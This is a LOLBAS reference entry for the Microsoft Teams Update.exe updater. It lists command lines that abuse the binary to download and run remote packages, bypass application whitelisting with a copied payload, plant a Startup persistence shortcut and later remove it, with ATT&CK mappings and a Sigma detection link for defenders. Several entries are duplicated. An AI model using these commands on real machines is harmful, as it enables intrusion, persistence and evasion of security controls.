---
title: "Update.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/
fetched_at: 2026-09-20T17:15:34Z
license: unspecified
category: windows
---

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

## Paths
- C:\Users\<username>\AppData\Local\Microsoft\Teams\update.exe

## Resources
- [https://www.youtube.com/watch?v=rOP3hnkj7ls](https://www.youtube.com/watch?v=rOP3hnkj7ls)
- [https://twitter.com/reegun21/status/1144182772623269889](https://twitter.com/reegun21/status/1144182772623269889)
- [https://twitter.com/MrUn1k0d3r/status/1143928885211537408](https://twitter.com/MrUn1k0d3r/status/1143928885211537408)
- [https://twitter.com/reegun21/status/1291005287034281990](https://twitter.com/reegun21/status/1291005287034281990)
- [http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/](http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/)
- [https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12](https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12)
- [https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56](https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56)
- [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/)

## Acknowledgements
- Reegun Richard Jayapaul (SpiderLabs, Trustwave) ([@reegun21](https://twitter.com/@reegun21))
- Mr.Un1k0d3r ([@MrUn1k0d3r](https://twitter.com/@MrUn1k0d3r))
- Adam ([@Hexacorn](https://twitter.com/@Hexacorn))
- Jesus Galvez

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml)
- IOC: Update.exe spawned an unknown process

## Download

1. The above binary will go to url and look for RELEASES file and download the nuget package.

```
Update.exe --download {REMOTEURL}
```

   - Use case: Download binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

2. The above binary will go to url and look for RELEASES file, download and install the nuget package.

```
Update.exe --update={REMOTEURL}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

3. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```
Update.exe --update={PATH_SMB:folder}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

4. The above binary will go to url and look for RELEASES file, download and install the nuget package.

```
Update.exe --updateRollback={REMOTEURL}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

5. Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current. Then run the command. Update.exe will execute the file you copied.

```
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

   - Use case: Application Whitelisting Bypass

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: CMDExecute: Remote

6. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```
Update.exe --updateRollback={PATH_SMB:folder}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

7. The above binary will go to url and look for RELEASES file, download and install the nuget package.

```
Update.exe --update={REMOTEURL}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

8. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```
Update.exe --update={PATH_SMB:folder}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

9. The above binary will go to url and look for RELEASES file, download and install the nuget package.

```
Update.exe --updateRollback={REMOTEURL}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

10. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

```
Update.exe --updateRollback={PATH_SMB:folder}
```

   - Use case: Download and execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: NugetExecute: Remote

11. Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current. Then run the command. Update.exe will execute the file you copied.

```
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

   - Use case: Execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1218

   - Tags: Execute: CMD

12. Copy your payload into “%localappdata%\Microsoft\Teams\current". Then run the command. Update.exe will create a shortcut to the specified executable in “%appdata%\Microsoft\Windows\Start Menu\Programs\Startup”. Then payload will run on every login of the user who runs it.

```
Update.exe --createShortcut={PATH:.exe} -l=Startup
```

   - Use case: Execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1547

   - Tags: Execute: EXE

13. Run the command to remove the shortcut created in the “%appdata%\Microsoft\Windows\Start Menu\Programs\Startup” directory you created with the LolBinExecution “–createShortcut” described on this page.

```
Update.exe --removeShortcut={PATH:.exe}-l=Startup
```

   - Use case: Execute binary

   - Privileges required: User

   - Operating systems: Windows 7 and up with Microsoft Teams installed

   - ATT&CK® technique: T1070

   - Tags: Execute: EXE
